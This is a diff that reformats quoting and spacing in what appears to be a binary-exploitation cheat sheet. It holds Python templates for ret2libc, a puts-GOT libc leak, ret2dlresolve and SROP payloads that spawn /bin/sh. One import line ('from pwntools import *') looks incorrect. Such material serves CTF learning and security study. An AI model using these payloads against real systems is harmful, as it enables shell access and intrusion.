@@ -62,17 +62,17 @@ When NX is enabled (stack not executable), redirect execution to libc functions.
 ### Classic ret2libc (32-bit)
 
 ```python
-payload = b'A' * offset
+payload = b"A" * offset
 payload += p32(system_addr)
-payload += p32(exit_addr)      # fake return address for system()
-payload += p32(binsh_addr)     # arg1: "/bin/sh"
+payload += p32(exit_addr)  # fake return address for system()
+payload += p32(binsh_addr)  # arg1: "/bin/sh"
 ```
 
 ### ret2libc (64-bit) — Need Gadgets for Arguments
 
 ```python
 pop_rdi = elf_base + 0x401234  # pop rdi; ret
-payload = b'A' * offset
+payload = b"A" * offset
 payload += p64(pop_rdi)
 payload += p64(binsh_addr)
 payload += p64(system_addr)
@@ -89,14 +89,14 @@ payload += p64(system_addr)
 
 ```python
 # Typical leak pattern
-rop = b'A' * offset
-rop += p64(pop_rdi) + p64(elf.got['puts'])
-rop += p64(elf.plt['puts'])
+rop = b"A" * offset
+rop += p64(pop_rdi) + p64(elf.got["puts"])
+rop += p64(elf.plt["puts"])
 rop += p64(main_addr)  # return to main for second payload
 
 io.sendline(rop)
-leak = u64(io.recvline().strip().ljust(8, b'\x00'))
-libc_base = leak - libc.symbols['puts']
+leak = u64(io.recvline().strip().ljust(8, b"\x00"))
+libc_base = leak - libc.symbols["puts"]
 ```
 
 ### one_gadget — Single Gadget RCE
@@ -183,6 +183,7 @@ Forge ELF dynamic linking structures to resolve an arbitrary function (e.g., `sy
 ```python
 # pwntools automation (recommended)
 from pwntools import *
+
 rop = ROP(elf)
 dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
 rop.read(0, dlresolve.data_addr)
@@ -208,6 +209,7 @@ Abuse the `sigreturn` syscall to set **all registers at once** from a fake Signa
 
 ```python
 from pwn import *
+
 frame = SigreturnFrame()
 frame.rax = constants.SYS_execve  # 59
 frame.rdi = binsh_addr
@@ -216,7 +218,7 @@ frame.rdx = 0
 frame.rip = syscall_ret_addr
 frame.rsp = new_stack_addr  # optional pivot
 
-payload = b'A' * offset
+payload = b"A" * offset
 payload += p64(pop_rax_ret) + p64(15)  # SYS_rt_sigreturn = 15
 payload += p64(syscall_ret)
 payload += bytes(frame)
